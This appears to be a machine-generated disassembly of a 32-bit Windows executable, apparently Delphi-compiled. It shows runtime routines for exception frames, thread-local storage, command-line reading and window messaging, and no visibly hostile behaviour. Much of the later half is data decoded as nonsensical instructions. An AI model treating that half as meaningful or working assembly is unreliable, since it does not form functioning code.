push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
pop ecx
pop edx
call sub_405984
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404654
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
sub_405c44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405cdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4046e8
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ce2
lea eax [ ebp - 0x4 ]
call sub_4046e8
retn
mov eax ebx
call sub_4042c8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404930
mov eax ebx
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_404854
inc eax
push eax
mov eax ebx
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_404844
pop ecx
pop edx
call sub_405a60
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4046e8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404930
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404724
sub_405ce8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d2b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404834
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d32
lea eax [ ebp - 0x4 ]
call sub_4046e8
retn
sub_405d38
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404200
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4052a4
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_4040f8
jmp r-xdata
sub_405d90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405df6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404278
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402cc4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405dfd
lea eax [ ebp - 0x10 ]
call sub_404008
retn
xor ebx ebx
sub_405e04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e4e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e55
retn
mov eax rw-data
call sub_402b3c
mov eax rw-data
call sub_402b3c
mov eax rw-data
call sub_402b3c
call sub_401ad0
sub_405e58
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404da4
call sub_4030d0
test al al
je r-xdata
call sub_4031c4
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40131c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_403100
call sub_40128c
call sub_405d90
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405d90
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_405f60
push ebx
call sub_405f58
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405f4c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403ffc
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403ffc
sub_405fa4
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405f60
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405ff0
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405f2c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405fe4
mov edx rw-data
mov eax ebx
call sub_403d50
pop ebx
retn
sub_406034
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406059
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406060
retn
sub_406090
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_4060ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4060d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4060d8
retn
sub_406b90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a70
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a60
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406be8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a70
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a60
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406c40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406d35
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406d5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d64
retn
sub_406d70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406d95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406d9c
retn
sub_406dab
add al dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh bh
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh ah
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh ch
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh dl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh bl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh al
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add al cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add cl cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dl cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bl cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ah cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add ch cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add dh cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add bh cl
inc [ eax ]
add [ esi + esi * 2 + 0x47 ] ah
add [ eax + 0x640000ff ] dh
jbe r-xdata
inc edi
add [ ecx + 0x640000ff ] dh
jbe r-xdata
inc edi
add [ ebx + 0x640000ff ] bh
jbe r-xdata
inc edi
add [ edx + 0x640000ff ] dh
jbe r-xdata
add [ edi + edi * 8 + 0x30 ] ah
add [ esi + 0x640000ff ] ah
jbe r-xdata
inc edi
add [ ebp + 0x640000ff ] ah
jbe r-xdata
add [ edi + edi * 8 + 0x76640000 ] bh
inc edi
add [ ebx + 0x640000ff ] dh
jbe r-xdata
xor eax eax
pop edx
add eax rw-data
add [ edi + 0x640000ff ] ah
jbe r-xdata
inc edi
add [ esi + 0x640000ff ] bh
jbe r-xdata
inc edi
add [ ebp + 0x640000ff ] bh
jbe r-xdata
add [ edi + edi * 8 + 0x76640000 ] dh
inc edi
add [ ebp + 0x640000ff ] dh
jbe r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4070c4
add [ eax + 0x640000ff ] ch
jbe r-xdata
inc edi
add [ edi + 0x640000ff ] bh
jbe r-xdata
inc edi
add [ esi + 0x640000ff ] dh
jbe r-xdata
inc eax
add bl al
jmp sub_403a0c
add [ ecx + 0x640000ff ] ch
jbe r-xdata
inc edi
add [ eax + 0x640000ff ] ah
jbe r-xdata
inc edi
add [ edi + 0x640000ff ] dh
jbe r-xdata
jmp r-xdata
add [ edx + 0x640000ff ] ch
jbe r-xdata
inc edi
add [ ecx + 0x640000ff ] ah
jbe r-xdata
inc edi
add [ eax + 0x640000ff ] bh
jbe r-xdata
retn
jl r-xdata
add [ ebx + 0x640000ff ] ch
jbe r-xdata
inc edi
add [ edx + 0x640000ff ] ah
jbe r-xdata
inc edi
add [ ecx + 0x640000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0x40 ] dh
add [ eax ] dl
add [ eax ] al
add al dl
jo r-xdata
inc edi
add [ ecx ] al
retn
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
jno r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
add [ edi + edi * 8 + 0x76640000 ] ch
inc edi
add [ ebx + 0x640000ff ] ah
jbe r-xdata
inc edi
add [ edx + 0x640000ff ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
sbb al 0xb9
inc eax
add [ eax + 0xe004032 ] al
inc ebp
dec eax
popad
jo r-xdata
jo r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
inc edi
add [ ebp + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
add [ edi + edi * 8 + 0x76640000 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] bh
jno r-xdata
enter 0x4034 0x0
sub [ edx ] dh
inc eax
add [ ecx + edi * 4 ] bl
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
jno r-xdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
test [ ecx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 2 + 0x100040 ] al
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 + 0x100040 ] dl
add [ eax ] al
shl [ eax + 0x40 ] 0x1
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 2 ] bh
inc eax
add [ eax + 0xc004032 ] al
inc ebp
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
sbb al 0xb9
add [ eax ] al
dec edi
dec bp
insd
outsd
jb r-xdata
cmp al 0x72
inc eax
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x40 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc ebp
jb r-xdata
add [ eax ] al
xchg esp eax
jb r-xdata
lea eax [ eax ]
inc eax
add [ eax ] dl
add [ eax ] al
add al dl
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x72
imul ebp [ edi + 0x6e ] 0x4071e090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
cld
jae r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jae r-xdata
popad
insb
mov eax eax
in al dx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dl
jo r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0xb004032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsd
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc ebp
inc ebp
js r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x12004032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 2 + 0x100040 ] ah
add [ eax ] al
add [ ebx + 0x40 ] dh
jb r-xdata
dec edi
jne r-xdata
xor al [ eax ]
or al 0x45
jb r-xdata
add [ eax ] al
add [ eax ] al
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x74
inc eax
add [ eax ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jae r-xdata
inc eax
shl [ ebx + esi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
inc ebp
inc ebp
js r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + 0x9004032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
jne r-xdata
inc ebp
jb r-xdata
insb
je r-xdata
add [ eax ] al
add [ eax + 0x72 ] cl
inc eax
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004074 ] dh
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] dl
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jae r-xdata
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004075 ] bh
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] ah
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ecx ] cl
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] ah
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x75 ] ah
inc eax
outsd
jb r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ ebx ] cl
inc eax
add [ eax + 0x4074 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi + 0x40 ] al
add [ eax + 0xc004032 ] al
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jae r-xdata
imul ebp [ edi + 0x6e ] 0x40734c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x10004076
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
jbe r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x75b86564
inc eax
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x4f746e49 ] cl
or [ ebp + 0x40 ] dh
add [ eax ] al
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ esp + esi * 2 + 0x40 ] ah
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x40 ] dh
outsd
ja r-xdata
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jbe r-xdata
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
sbb al 0xb9
inc eax
add [ eax + 0xf004032 ] al
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] bh
jno r-xdata
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] ch
inc eax
